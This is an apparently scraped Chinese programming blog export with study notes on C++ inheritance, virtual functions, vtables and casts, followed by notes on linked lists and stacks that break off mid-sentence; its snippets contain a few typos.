//print()具有二义性，系统不知道是调用B类的还是C类的print()函数，语句2&#125; 上述代码的语句2d.print();编译错误，可改为以下的其中一种： 12d.B.print();d.C.print(); 但是不能改为d.A.print();，因为d对象中有2个A类对象，故编译会报“基类A不明确”。 而语句2A* pa=(A*) &amp;d;产生的二义性也是因为d对象中有2个A类对象，转换时不知道让pa指向哪个子对象，可以改为以下的一种： 12A* pa=(A*) (B*)&amp;d;A* pa=(A*) (C*)&amp;d; 事实上，使用关键字virtual将共同基类A声明为虚基类，可有效解决上述二义性的问题。 转换构造函数转换构造函数可以用单个实参来调用，其定义从形参类型到该类类型的一个隐式转换。 1234567class Integral &#123;public: Integral(int=0);//转换构造函数private : int real;&#125;;Integral integ=1; //调用转换构造函数将1转换为Integral类的对象 转换构造函数需满足以下条件之一: Integral类的定义和实现中给出了仅包括只有一个int类型参数的构造函数； Integral 类的定义和实现中给出了包含一个int类型参数，且其他参数都有缺省值的构造函数； Integral 类的定义和实现中虽然不包含int 类型参数，但包含一个非 int类型参数如float类型，此外没有其他参数或者其他参数都有缺省值，且int类型参数可隐式转换为float类型参数。 可以通过将构造函数声明为explicit, 来禁止隐式转换。 类型转换函数类型转换函数的作用是将一个类的对象转换成另一类型的数据，与转换构造函数作用相反。在类中，定义类型转换函数的一般格式为： 12345678910class Integral &#123;public: Integral(int=0); //转换构造函数 operator int()&#123; //类型转换函数，函数名为operator int，指明转换的目标类型为int return real; &#125;private:int real;Integral integ=1; //调用转换构造函数将int型的1转换为Integral类的对象int i=integ; //调用类型转换函数将integ转换为int类型 定义类型转换函数，需要注意以下几点: 转换函数必须是成员函数，不能是友元形式; 转换函数不能指定返回类型，但在函数体内必须用return语句以传值方式返回一个目标类型的变量 转换函数不能有参数。 非C++内建型别A和B，在以下几种情况下B能隐式转化为A。 B公有继承自A，可以是间接继承的。 12class B:public A&#123;&#125;; 此时若有A a; B b;， 则a=b;合法。 B中有类型转换函数。 123class B&#123; operator A(); // 类型转换函数，将B类对象强制转换为A类类型&#125;; 此时若有A a; B b;， 则a=b;合法。 A实现了非explicit的参数为B (可以有其他带默认值的参数)的构造函数 123class A&#123; A(const B&amp;); // 转换构造函数&#125;; 此时若有A a; B b;， 则a=b;合法。 9.2 虚函数多态通俗地说，多态性是指同一个操作作用于不同的对象就会产生不同的响应； 多态性分为静态多态性和动态多态性： 静态多态性：函数重载和运算符重载 动态多态性：虛函数 静态联编与动态联编以函数重载为例，C++编译器根据传递给函数的参数和函数名决定具体要使用哪一个函数，称为联编或绑定(binding)。 编译器可以在编译过程中完成这种联编，在编译过程中进行的联编叫静态联编(static binding)或早期联编(early binding)。在一些场合下，编译器无法在编译过程中完成联编，必须在程序运行时完成选择，因此编译器必须提供一套称为“动态联编”(dynamic binding)的机制，也叫晚期联编(late binding)，C++通过虚函数来实现动态联编。 如果一个基类的成员函数定义为虚函数，那么，它在所有派生类中也保持为虚函数；即使在派生类中省略了virtual 关键字，也仍然是虚函数。 派生类中可根据需要对虚函数进行重定义，重定义的格式有一定的要求： 与基类的虚函数有相同的参数个数 与基类的虚函数有相同的参数类型 与基类的虚函数有相同的返回类型；或者都返回指针(或引用)，并且派生类虚函数所返回的指针(或引用)类型是基类中被替换的虚函数所返回的指针(或引用)类型的子类型(派生类型)。 虚函数的访问虚函数可以通过对象名来调用，此时编译器采用的是静态联编。通过对象名访问虚函数时，调用哪个类的函数取决于定义对象名的类型。 &#x3D;&#x3D;使用指针访问非虚函数时，编译器根据指针本身的类型决定要调用哪个函数&#x3D;&#x3D;，而不是根据指针指向的对象类型； &#x3D;&#x3D;使用指针访问虚函数时，编译器根据指针所指对象的类型决定要调用哪个函数（动态联编）&#x3D;&#x3D;，而与指针本身的类型无关。 因此这里虚函数的作用就是使得指向基类的指针在操作它的多态类对象时，是根据不同的类对象来调用相应的函数，而不是调用基类的函数。 使用引用访问虚函数，与使用指针访问虚函数类似，不同的是，引用一经声明后，引用变量本身无论如何改变，其调用的函数就不会再改变，始终指向其开始定义时的函数。因此在使用上有一定限制，但这在一定程度上提高了代码的安全性。 总结如下，C++中的函数调用默认不使用动态绑定。要触发动态绑定，需满足两个条件： 第一，只有指定为虚函数的成员函数才能进行动态绑定，成员函数默认为非虚函数，非虚函数不进行动态绑定； 第二，必须通过基类类型的引用或指针进行函数调用。 12345678910111213141516class base&#123;public: virtual void disp() &#123;cout &lt;&lt; &quot;hel1o, base1&quot;&lt;&lt; endl; &#125; // 虚函数 void disp2() &#123;cout &lt;&lt; &quot;hello, base2&quot; &lt;&lt; endl; &#125; // 默认为非虚函数&#125;;class childl :public base &#123;public: void disp() &#123;cout &lt;&lt; &quot;hello, child1&quot; &lt;&lt; endl; &#125; // 覆盖基类的虚函数disp void disp2 () &#123;cout &lt;&lt; &quot;hello, child2&quot; &lt;&lt; endl; &#125;&#125;;void main() &#123;base * base=NULL;childl obj_child1;base = &amp;obj_childl; // 派生类地址给基类指针赋值，发生隐式转换base-&gt;disp(); // 通过指针访问虚函数，根据指针所指对象的类型决定调用的函数，base指向childl类类型base-&gt;disp2() ; // 通过指针访问非虚函数，根据指针本身的类型决定调用的函数，base为base类类型 上述代码的输出为： 12hello, child1hello, base2 常见的不能声明为虚函数的有： 普通函数(非成员函数)、静态成员函数、构造函数、友元函数，而内联成员函数、赋值操作符重载函数即使声明为虚函数也无意义。 析构函数可以被声明为虚函数，因为销毁对象时需要识别对象类型。 构造函数不能为虚函数： 若基类的构造函数为虚函数，那么派生类的构造函数会覆盖基类的构造函数，使得基类无法构造。且虚函数旨在在不同类型的对象上产生不同动作，而构造函数运行时对象还未产生。 普通函数不能为虚函数： 普通函数只能被重载，不能被覆盖，声明为虚函数没有意义。 静态函数不能为虚函数： 静态函数属于类，而不是对象，所以没有动态绑定的需要。 友元函数不能为虚函数： C++不支持友元函数的继承 12345678910111213141516class A&#123;public: virtual void Fun (int number=10) &#123; std: :cout &lt;&lt; &quot;A::Fun with number”&lt;&lt; number&lt;&lt;endl;&#125;;class B: public A&#123;public: virtual void Fun (int number=20) &#123; std::cout &lt;&lt; &quot;B::Fun with number ”&lt;&lt; number&lt;&lt;endl ;&#125;;int main() &#123; B b; A &amp;a=b; a.Fun(); return 0;&#125; 上述代码输出为B::Fun with number 10 。由于A中的Fun函数为虚函数，所以a.Fun()会动态联编到a所引用的对象b的Fun函数上，因此输出B::Fun with number 10。之所以number变量为10，是因为缺省实参是编译时确定的，在动态联编之前。 构造函数和析构函数中的虚函数构造派生类对象时，首先运行基类构造函数初始化对象的基类部分。在执行基类构造函数时，对象的派生类部分是未初始化的。实际上，此时对象还不是一个派生类对象。 撤销派生类对象时，首先撤销它的派生类部分，然后按照与构造顺序的逆序撤销它的基类部分。 在这两种情况下，运行构造函数或析构函数时，对象都是不完整的。为了适应这种不完整，编译器将对象的类型视为在构造或析构期间发生了变化。在基类构造函数或析构函数中，将派生类对象当作基类类型对象对待。 如果在构造函数或析构函数中调用虚函数，则运行的是为构造函数或析构函数自身类型定义的版本（静态联编）。 解析：构造函数不需要是虚函数，也不允许是虚函数，因为创建一个对象时我们总是要明确指定对象的类型，尽管我们可能通过实验室的基类的指针或引用去访问它但析构却不一定，我们往往通过基类的指针来销毁对象。这时候如果析构函数不是虚函数，就不能正确识别对象类型从而不能正确调用析构函数。 虚函数表指针（vptr）及虚基类表指针（bptr）C+ +在布局以及存取时间上主要的额外负担是由virtual引起的，包括: virtual function 机制：用以支持-一个有效率的“执行期绑定”; virtual base class：用以实现多次出现在继承体系中的基类，有一个单一而被共享的实体。 虚函数表指针C++中数据成员可以分为静态和非静态，以及三种类成员函数：静态、非静态和虚函数。 其中，非static数据成员被配置于每一个对象之内，static 数据成员则被存放在所有的对象之外，通常被放置在程序的全局(静态)存储区内，故不会影响个别的对象大小。static 和非static函数也被放在所有的对象之外。virtual 函数则以两个步骤支持之： 每一个类产生出一堆指向virtual functions的指针，放在表格之中，这个表格被称为virtual table(vtbl)； 每一个对象被添加了一个指针，指向相关的vitual table。通常这个指针被称为**vptr (虚函数表指针)**。vptr 的设定和重置都由每一个类的构造函数、析构函数和复制构造函数自动完成。（每个虚函数的存在会为类的内存空间增加一个虚函数表指针） 含静态变量、虚函数的类的空间计算sizeof应用在类和结构的处理情况是相同的。但需要注意结构或者类中的静态成员不对结构或者类的大小产生影响，因为静态变量的存储位置与单个对象的地址无关。 空类的大小为1个字节。含有虚函数的类会多出虚函数表指针的空间占用。 12345678910111213141516171819202122232425262728class A&#123;&#125;; // 空类占1个字节class B&#123; // 有一个虚函数，因此B中有指针vptr，占4个字节public: B() ; virtual ~B() ;&#125;;class C&#123; // 大小为4、4（2对其为4）、4、64、4、4的和，为84private:#pragma pack(4) // 设置编译器按照4个字节对齐 int i; short j; float k; char 1[64] ; long m; char *p;#pragma pack()&#125;;class D&#123; // 大小为4、2、4、64、4、4的和，为82private:#pragma pack(1) // 设置编译器按照1个字节对齐 int i; short j; float k; char 1 [64]; long m; char *p;#pragma pack()&#125;; 上述代码中，各类的sizeof结果为1、4、84、82。 虚函数表的实现使用指针访问虚函数时，编译器根据指针所指对象的类型决定要调用哪个函数（动态联编）。比如有基类A及其派生类B，基类A中有一个虚函数fun()，派生类也有一个函数fun()进行覆盖。若有一B类对象b，对于语句A* a=&amp;b; a-&gt;fun();，其运行时会发生动态联编，调用的fun()为指针所指的B类对象b的函数，而不是A类。 但是此过程中，父类指针a是如何根据虚函数表找到子类B的虚函数的? 首先父类指针a所指空间为对象b，其中存在虚函数表指针vptr，通过其可以找到对象b的虚函数表，进而找到类B的函数fun()。 例如： 12345678910111213141516171819202122class A&#123;public: virtual void a() &#123;cout &lt;&lt; &quot;a() in A&quot;&lt;&lt; endl; &#125; virtual void b() &#123;cout &lt;&lt; &quot;b() in A&quot; &lt;&lt; endl; &#125; virtual void c() &#123;cout &lt;&lt; &quot;c() in A&quot; &lt;&lt; endl; &#125; virtual void d() &#123;cout &lt;&lt; &quot;d() in A&quot; &lt;&lt; endl; &#125;&#125;;class B : public A&#123;public: void a() &#123;cout &lt;&lt; &quot;a() in B&quot; &lt;&lt; endl; &#125; void b() &#123;cout&lt;&lt; &quot;b() in B&quot; &lt;&lt; endl; &#125;&#125;;class C : public A&#123;public: void a() &#123;cout &lt;&lt; &quot;a() in C&quot; &lt;&lt; endl; &#125; void b() &#123;cout &lt;&lt; &quot;b() in C&quot; &lt;&lt; endl; &#125;&#125;;class D : public B, public C&#123;public: void a() &#123;cout &lt;&lt; &quot;a() in D&quot; &lt;&lt; endl; &#125; void d() &#123;cout &lt;&lt; &quot;d() in D&quot; &lt;&lt; endl; &#125;&#125;; 上述代码中，类A的对象的虚函数表如下，每个各自记录一个函数的地址： 由于B、C继承自A，所以其定义的a()、b()也为虚函数。类B、C的对象的虚函数表如下： 可见单基继承时，仅有一个vptr。派生类的函数覆盖了基类的同名函数，虚函数表中相应位置也替换为了新函数的地址。通过对象的虚函数表指针vptr就可以找到所属类的函数了。 类D的对象的虚函数表如下： 可见，多基继承时，有几个基类就有几个vptr。D类中的函数a与d覆盖了B类中的同名函数，故虚函数表中对应位置替换为新函数的地址。D类中的函数a与d覆盖了C类中的同名函数，故虚函数表中对应位置替换为新函数的地址。 虚基类表指针继承也可以指定为虚拟（virtual）。在虚拟继承的情况下，基类不管在继承串链中被派生多少次，永远只会存在一个实体。 在虚拟继承基类的子类中，子类会增加某种形式的指针，或者指向虚基类子对象，或者指向一个相关的表格；表格中存放的不是虚基类子对象的地址，就是其偏移量。此指针被称为bptr，如下图所示。 注意：在同时存在vptr与bptr时，某些编译器会将其进行优化，合并为一个指针。 12345678910class X&#123;&#125;; // 空类，占1个字节class Y:public virtual X&#123;&#125;; // 虚拟继承，需要虚基表指针bptr的空间，4个字节，继承自X的1字节被优化为0class Z:public virtual X&#123;&#125;;class A:public Y, public Z&#123;&#125;; // 继承Y，占4个字节；继承Z，占4个字节；总共占8个字节int main() &#123; cout &lt;&lt; &quot;sizeof(X) : &quot;&lt;&lt; sizeof(X) &lt;&lt; endl; cout.&lt;&lt; &quot;sizeof(Y) : &quot;&lt;&lt; sizeof(Y) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof(Z) : &quot;&lt;&lt; sizeof(Z) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof(A) : &quot;&lt;&lt; sizeof(A) &lt;&lt; endl;&#125; 虚拟继承时构造函数的书写对普通的多层继承而言，构造函数的调用是嵌套的，如由C1类派生C2类，C2 类又派生C3类时，则各个构造函数有如下形式: 12C2 (总参数表) :C1 (参数表)C3 (总参数表) :C2 (参数表) 而对虚基派生来说，如果按照上述规则，若A类虚拟派生B类、C类，D类继承B类、C类，则各个构造函数有如下形式: 123B(总参数表) :A(参数表)C(总参数表) :A(参数表)D(总参数表) :B(参数表)，C(参数表)，A(参数表) ​ 根据虚基派生的性质，类D中只有一份虚基类A的拷贝，因此A类的构造函数在D类中只能被调用一次。所以，从A类直接虚拟派生(B和C)和间接派生(D)的类中，其构造函数的初始化列表中都要列出对虚基类A构造函数的调用。这种机制保证了不管有多少层继承，虚基类的构造函数必须且只能被调用一次。 若在初始化列表中没有显式调用虚基类的构造函数，则将调用虚基类的默认构造函数，若虚基类没有定义默认构造函数，则编译出错。 纯虚函数纯虚函数是一一种特殊的虚函数，它的一般格式如下: 123class &lt;类名&gt;&#123;virtual &lt;类型&gt; &lt;函数名&gt; (&lt;参数表&gt;)=0;&#125;; 在许多情况下，在基类中不对虚函数给出有意义的实现，而把它声明为纯虚函数，它的实现留给该基类的派生类去做。这就是纯虚函数的作用。纯虚函数可以让类先具有一个操作名称，而没有操作内容，让派生类在继承时再去具体地给出定义。**凡是含有纯虚函数的类称为抽象类**。这种类不能声明对象，只是作为基类为派生类服务。除非在派生类中完全实现基类中所有的纯虚函数，否则，派生类也是抽象类，不能实例化对象。 只定义了protected 型构造函数的类也是抽象类。对一个类来说，如果只定义了protected 型的构造函数而没有提供public构造函数，无论是在外部还是在派生类中都不能创建该类的对象，但可以由其派生出新的类，这种能派生新类，却不能创建自己对象的类是另一种形式的抽象类。 抽象类不能声明对象，但是可以作为指针或者引用类型使用。 9.3 动态运行时类型识别与显式转换typeid通过运行时类型识别(RTTI)，程序能够使用基类的指针或引用来检索这些指针或引用所指对象的实际类型。 C++通过下面两个操作符提供RTTI： typeid 操作符，返回指针或引用所指对象的实际类型。操作对象为指针所指对象。 dynamic_ cast 操作符，将基类类型的指针或引用安全地转换为派生类型的指针或引用。 typeid 操作符使程序能够询问一个表达式的类型。 typeid表达式形如: typeid(e)。 这里e是任意表达式或者是类型名。用法如下所示： 12345Base *bp;Derived *dp;if (typeid(*bp) == typeid(*dp)) &#123;…&#125; // 比较bp所指对象与dp所指对象的实际类型if (typeid(*bp) == typeid(Derived)) &#123;…&#125; // 判断bp所指对象是否为Derivedif (typeid(bp) == typeid(Derived)) &#123;…&#125; // 比较Base *类型和Derived类型，两类型不相等，测试失败 只有当typeid的操作数是带虚函数的类类型的对象的时，才返回动态类型信息。测试指针(相对于指针指向的对象)返回指针的静态的、编译时类型。 显示转换也叫强制类型转换，包括以下强制类型转换操作符：static_cast、dynamic_cast、const_cast、reinterpret_cast。 命名的强制类型转换符号的一-般形式如下： 1cast-name&lt;type&gt; (expression) ; 其中，cast-name 为static_ cast、 dynamic_ cast、 const_ cast 和reinterpret cast 之一， type 为转换的目标类型，而expression则是被强制转换的表达式。强制转换的类型指定了在expression上执行某种特定类型的转换。 reinterpret_cast在引入命名的强制类型转换操作符之前，显式强制转换用圆括号将类型括起来实现: 12int *ip;char *pc = (char*) ip; 效果与使用reinterpret cast符号相同。 12int ip;char *pc = reinterpret_cast&lt;char*&gt;(ip) ; const_cast将转换掉表达式的const性质。 12const char *ip;char *pc = const_cast&lt;char*&gt;(ip); 只有使用const_ cast 才能将const性质转换掉。在这种情况下，试图使用其他三种形式的强制转换都会导致编译时的错误。类似地，除了添加或删除const特性，用const _cast 符来执行其他任何类型转换，都会引起编译错误。 static_cast编译器隐式执行的任何类型转换都可以由static_ cast显式完成： 12345double d=97.0;int i = static cast&lt;int&gt;(d) ;// 等价于:double d=97.0;int i=d; 仅当类型之间可隐式转换时（除类层次间的下行转换以外），static cast 的转换才是合法的，否则将出错。类层次间的下行转换属于强制转换，是不能通过隐式转换完成的，请看下例。 123456class base&#123;&#125;;class child:public base&#123;&#125;;base* b;child* c;c = static cast&lt;child*&gt;(b);// 下行转换，错误c = b; // 基类对象不能给派生类赋值，编译不正确 dynamic_cast​ 该运算符把expression转换成type类型的对象。type 必须是类的指针、类的引用或者void*。如果type是指针类型，那么expression也必须是一个指针， 如果type是一个引用，那么expression也必须是一个引用。​ 与其他强制类型转换不同，dynamic_ cast 涉及运行时类型检查。dynamic_ cast 运行时的类型检查需要运行时的类型信息，而这个类型信息存储在类的虚函数表中，只有定义了虚函数的类才有虚函数表，没有定义虚函数的类是没有虚函数表的，对没有虚函数表的类使用会导致dynamic_ cast 编译错误。​ 如果绑定到引用或指针的对象的类型不是目标类型，则dynamic_cast 失败。如果转换到指针类型的dynamic_cast 失败，则dynamic_cast 的结果是0值；如果转换到引用类型的dynamic_cast失败，则抛出一个bad_cast 类型的异常。​ 因此，dynamic_cast 操作符一次执行两个操作。 它首先验证被请求的转换是否有效，只有转换有效，然后操作符才实际进行转换。一般而言，引用或指针所绑定的对象的类型在编译时是未知的，基类的指针可以赋值为指向派生类对象,同样，基类的引用也可以用派生类对象初始化，因此，dynamic_cast操作符执行的验证必须在运行时进行。 12345678910class A&#123;public: A() &#123;&#125;&#125;;class B:public A&#123;public: B() &#123;&#125;&#125;;A *pb=new B(); // 定义A*类型的指针，指向B类类型的对象B b; 针对上述代码，下列语句的执行情况如何： 12345A *pa = dynamic_cast&lt;A *&gt;(pb); // 通过。pb本来就是A*类型，实际上不需要转换类型A *pa = dynamic_cast&lt;B *&gt;(pb); // 编译错误。运行时dynamic cast的操作数必须包含多态类类型，而B类没有虚函数A *pa = static_ cast&lt;A *&gt;(pb); // 通过。pb本来就是A*类型，实际上不需要转换类型A a = static_ cast&lt;A &gt;(b); // 通过。派生类对象赋值给基类对象，发生隐式转换A a = dynamic cast&lt;A &gt;(b); // 编译错误。用dynamic_cast进行转换时，待转换的类型只能是指针或引用 dynamic_cast 主要用于类层次间的上行转换和下行转换。dynamic_cast 运算符可以在执行期决定真正的类型。如果下行转换是安全的(也就说，如果基类指针或者引用确实指向一个派生类对象)，这个运算符会传回转型过的指针。如果downcast不安全，这个运算符会传回空指针(也就是说，基类指针或者引用没有指向一个派生类对象)。 在类层次间进行上行转换时，dynamic cast 和static cast 的效果是一样的；在进行下行转换时，dynamic_ cast 具有类型检查的功能，比static_ cast 更安全。","raw":null,"content":null,"categories":[],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://frankcao3.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"数据结构","slug":"计算机基础/2. 数据结构","date":"2021-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.709Z","comments":true,"path":"posts/[object Object]/计算机基础/2. 数据结构/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/2.%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/undefined","excerpt":"","text":"数据结构线性表：具有相同特性的数据元素的一个有限序列。 具有有穷性、一致性（所有元素的性质相同）、序列性（所有元素的相对位置是线性的，即存在唯一的开始元素和终端元素，除此之外每个元素只有唯一的前驱元素和后继元素）。 线性表的顺序存储结构：顺序表，借助数组实现（数组存放线性表元素、另外一个int型的值存放线性表长度）。 顺序表求线性表长度、按索引取元素的时间复杂度为O(1)，按值查找元素的时间复杂度为O(n)，插入、删除元素的平均时间复杂度为O(n)。 1 链表线性表的链式存储结构：链表。 可分为单链表、双链表、循环链表。 链表可用来表示线性表，也可以用来表示各种非线性的数据结构。 1.1 单链表单链表结点类型描述如下： 1234typedef struct LNode &#123; ElemType data; struct LNode * next;&#125;LinkNode; 单链表的建立： 头插法 常用在将一个已存在的链表逆序。 12345678ListNode * L = new ListNode(-1);L-&gt;next = NULL;for(int i=0;i&lt;n;i++)&#123; ListNode * s = new ListNode(-1); s-&gt;data = a[i]; s-&gt;next = L-&gt;next; // 头插法 L-&gt;next = s;&#125; **&#x3D;&#x3D;使用头插法将链表x逆序&#x3D;&#x3D;**： 12345678910111213typedef struct item&#123; char C; struct item next:&#125;Item;Item *Routinel (Item *x) &#123; Item *prev=NULL, *curr=x; while(curr) &#123; // 遍历结点 Item next=curr-&gt;next; curr-&gt;next=prev; // 头插法 prev=curr; // 更新指针 curr=next; return prev;&#125; 尾插法 需要增加一个尾指针，始终指向当前链表的尾结点。 123456789ListNode * L = new ListNode(-1);ListNode * r;r = L; // 初始化尾指针rfor(int i=0;i&lt;n;i++)&#123; ListNode * s = new ListNode(-1); s-&gt;data = a[i]; r-&gt;next = s; // 尾插法 r = s;&#125; 单链表的插入、删除、取元素的时间复杂度均为O(n)；求线性表长度的时间复杂度为O(n)；求线性表中某个元素的值、按值查找元素、以及插入、删除元素的时间复杂度均为O(n)。 顺序表和链表的比较： 存取方式 顺序表可以顺序存取，也可以随机存取，链表只能从表头顺序存取元素。 查找、插入和删除操作 对于按值查找，当顺序表在无序的情况下，两者的时间复杂度均为O(n)；而当顺序表有序时，可采用折半查找，此时时间复杂度为O(log2n)。 对于按序号查找，顺序表支持随机访问，时间复杂度仅为O(1)，而链表的平均时间复杂度为O(n)。 顺序表的插入、删除操作，平均需要移动半个表长的元素，因此平均时间复杂度为O(n)。链表的插入、删除操作时，只需要修改相关结点的指针域即可，时间复杂度均为O(n)。 3)空间分配 链式存储的结点空间在需要的时候申请分配，操作灵活、高效。 1.2 快慢指针快慢指针中的快慢指的是移动的步长，即每次向前移动速度的快慢。例如可以让快指针每次沿链表向前移动2，慢指针每次向前移动1次。 用途： &#x3D;&#x3D;判断单链表是否存在环&#x3D;&#x3D; 如果链表存在环，就好似操场的跑道是一个环形。此时让快、慢指针都从链表头开始遍历，快指针每次向前移动两个位置，慢指针每次向前移动一个位置；如果快指针到达NULL，说明链表以NULL为结尾，没有环。如果快指针追上慢指针，则表示有环。 &#x3D;&#x3D;寻找循环链表的入口&#x3D;&#x3D; 假设链表存在环，那么怎么寻找环的入口呢? 假设链表长为L，起始点到环入口长度为a，环长度为r，则L&#x3D;atr， 如图11-3所示。 ​ 在快指针进入环到慢指针进入环前的这段时间，若环的长度较短，也许快指针已经走了好几圈了，然后慢指针进入环。 设慢指针和快指针在环内相遇时，慢指针在环内走了X步，走的总步数（包括环内与环外）为S步（显然S=X+a），那么快指针走了多少步呢？快指针在环内已经走了n圈加X步，即nr+X步，其中n最少为1，而走的总步数为nr+X+a步。由于快指针走的总步数为慢指针的2倍，故nr+X+a=(X+a)*2。由上式得a+X = nr，即a = nr-X = (n-1)r+r-X； 因此a和r-x相差r的整数倍，也就是说，若令快慢指针的步长均为1，慢指针从链表头开始走，快指针从相遇点也继续往前走，两者走的距离为a = (n-1)r+r-X时，两者相遇，此时就是环入口的位置。 123456789101112131415161718192021ListNode* FindBeginning (ListNode* head) &#123; ListNode* n1=head; ListNode* n2=head; while (n2-&gt;next != NULL) &#123;//寻找相遇点 n1=n1-&gt;next; n2=n2-&gt;next-&gt;next; if(n1==n2)&#123; // 有环 break; //没有相遇，因而没有环 if (n2-&gt;next == NULL) &#123; return NULL; &#125; /*确定环入口，将n1从head开始移动，n2从相遇点处移动*/ n1=head; while (n1 != n2) &#123; n1=n1-&gt;next; n2=n2-&gt;next; &#125; // 现在n2指向的就是环入口 return n2;&#125; 在有序链表中寻找中位数 利用快慢指针可不借助计数器变量实现寻找中位数的功能。 原理是：快指针的移动速度是慢指针移动速度的2倍，因此当快指针到达链表尾时，慢指针到达中点。程序还要考虑链表结点个数的奇偶数因素，当快指针移动x次(每次2步)后到达表尾，说明链表有奇数个结点，直接返回慢指针指向的数据即可。如果快指针是倒数第二个结点，说明链表结点个数是偶数，这时可以根据“规则”返回上中位数或下中位数或(上中位数+下中位数)的一半。 事实上，像快慢指针这种用两个指针分别前进来查找某个结点，还有其他的形式。 例1：&#x3D;&#x3D;寻找倒数第K个结点&#x3D;&#x3D;。 我们可以定义两个指针，第一个指针从链表的头指针开始遍历向前走k-1步，第二个指针保持不动；从第k步开始，第二个指针也开始从链表的头指针开始遍历。由于两个指针的距离保持在k-1，当第一个指针到达链表的尾结点时，第二个指针正好是倒数第k个结点。 1234567891011121314ListNode* findKthtoTail (ListNode* P, unsigned int k) &#123; assert(p != NULL &amp;&amp; k &gt;= 1); ListNode* pa=p, *pb=p; for(int i=0; i &lt; k-1; ++i) &#123; pa-pa-&gt;pNext; if(pa == NULL) return NULL;// 当链表p的长度小于k的时候，返回NULL; &#125; while (pa-&gt;pNext != NULL) &#123; pa=pa-&gt;pNext; pb=pb-&gt;pNext; &#125; return pb;&#125; 例2：&#x3D;&#x3D;确定两个单向链表是否相交，若相交找出第一个公共结点。&#x3D;&#x3D; 解答：首先利用快慢指针判断链表是否有环。 如果都不存在环，则如果两个单向链表有公共的结点，也就是说两个链表从某一结点开始，它们的后继结点指针都指向同一个结点。但由于是单向链表的结点，每个结点只有一个next指针，因此从第一个公共结点开始，之后它们所有结点都是重合的，如下图所示。 如何寻找相较的第一个结点： 首先两个链表各遍历一次，求出两个链表的长度L1、 L2, 然后可得出两个链表的长度差L。然后先在长的链表上遍历L个结点，之后再同步遍历，于是在遍历中，第一个相同的结点就是第一个公共的结点。此时，如果第一个链表的长度为m,第二个链表的长度为n，该方法的时间复杂度为O(m+n)。 如果一个存在环，另一个不存在环，则这两个链表是不可能相交的； 如果利用快慢指针发现两个链表都存在环，则判断任意一个链表上快慢指针相遇的那个结点在不在另一条链表上（共环，末尾结点存在环中）。如果在，则相交，如果不在，则不相交。若相交，两个链表的入口点可能并不是环上同一个结点，则再利用本节的方法各自找出两个链表环的入口点，可以定义任一入口点为相交的第一个结点。 1.3 双链表使得查找某个结点的前驱结点的时间复杂度从O(n)变为了O(1)。 双链表的插入操作 在双链表中p所指结点之后插入结点s 1234s-&gt;next = p-&gt;next; // 将s结点插入p结点之后p-&gt;next-&gt;prior = s;s-&gt;prior = p;p-&gt;next = s; // 最后修改p-&gt;next 双链表的删除操作 删除双链表中结点p的后继结点q 123p-&gt;next = q-&gt;next;q-&gt;next-&gt;prior = p;free(q); 2 栈与队列栈与队列同样是线性表，具有和线性表相同的逻辑结构，但是操作受限。 2.1 栈（堆栈）栈，也叫堆栈，其限制是仅允许在表的一端进行插入和删除。人们把此端称为栈顶，栈顶的第一个元素被称为栈顶元素，相对地，把另一端称为栈底。向一个栈插入新元素又称为进栈或入栈（push），它是把该元素放到栈顶元素的上面，使之成为新的栈顶元素；从一个栈删除元素又称为出栈或退栈（pop），它是把栈顶元素删除掉，使其下面的相邻元素成为新的栈顶元素。 由于堆栈数据结构只允许在一端进行操作，因而按照后进先出（LIFO, Last In First Out）的原理运作。 栈的顺序存储结构1234typedef struct&#123; ElemType data[MaxSize]; // 存放栈中的数据元素，下标范围为0 ~ MaxSize-1 int top; // 栈顶指针，存放栈顶元素在data数组中的下标&#125;SqStack； 栈空的条件：s-&gt;top == -1。 栈满的条件：s-&gt;top == MaxSize-1。 进栈： 1234567bool Push(SqStack * &amp;s, ElemType e)&#123; if(s-&gt;top == MaxSize-1) // 栈已满 return false; s-&gt;top++; // 入栈，栈顶指针加1 s-&gt;data[s-&gt;top] = e; return true;&#125; 出栈： 1234567bool Pop(SqStack * &amp;s, ElemType &amp;e)&#123; // 注意e为引用 if(s-&gt;top == -1) // 栈已空 return false; e = s-&gt;data[s-&gt;top]; // 取栈顶元素 s-&gt;top--; // 出栈，栈顶指针减1 return true;&#125; 取栈顶元素： 123456bool GetTop(SqStack * &amp;s, ElemType &amp;e)&#123; // 注意e为引用 if(s-&gt;top == -1) // 栈已空 return false; e = s-&gt;data[s-&gt;top]; // 取栈顶元素 return true;&#125; 销毁栈：free(s)。 栈的链式存储结构——链栈1234typedef struct linknode&#123; ElemType data; // 存放栈中的数据元素 struct linknode *next; // 指针域&#125;LinkStNode； 栈空的条件：s-&gt;next == NULL。 栈满的条件：不考虑。 进栈：插入头节点之后 123456bool Push(LinkStNode * &amp;s, ElemType e)&#123; LinkStNode *p = new LinkStNode(); p-&gt;data = e; p-&gt;next = s-&gt;next; // 入栈,插入头结点s之后，作为新的首结点 s-&gt;next = p;&#125; 出栈： 12345678910bool Pop(LinkStNode * &amp;s, ElemType &amp;e)&#123; // 注意e为引用 LinkStNode *p; if(s-&gt;next == NULL) // 栈已空 return false; p = s-&gt;next; // p指向首结点 e = p-&gt;data; // 提取首结点值 s-&gt;next = p-&gt;next; // 删除首结点 free(p); return true;&#125; 取栈顶元素： 123456bool GetTop(LinkStNode * &amp;s, ElemType &amp;e)&#123; // 注意e为引用 if(s-&gt;next == NULL) // 栈已空 return false; e = s-&gt;next-&gt;data; // 取栈顶元素 return true;&#125; 2.2 栈的应用中缀表达式和后缀表达式中缀表达式：运算符在数之间，如A+B*(C-D)-E/F，需要考虑运算符的出现顺序、优先级，以及括号的使用。 后缀表达式（逆波兰式）：把运算符放在两个运算对象之后。不存在括号，也不存在优先级的差别，计算过程按照运算符出现的先后次序进行。比如A+B*(C-D)-E/F对应的后缀表达式为ABCD-*+EF/-。 &#x3D;&#x3D;中缀表达式转换为后缀表达式：&#x3D;&#x3D; 方法一：使用两个栈实现 要使用到2个栈，stack栈用来存放运算符，post栈用来存放最后的后缀表达式。 转换原则是：从左向右扫描中缀表达式，若读到的是操作数，则直接存入post栈；若读到的是运算符： 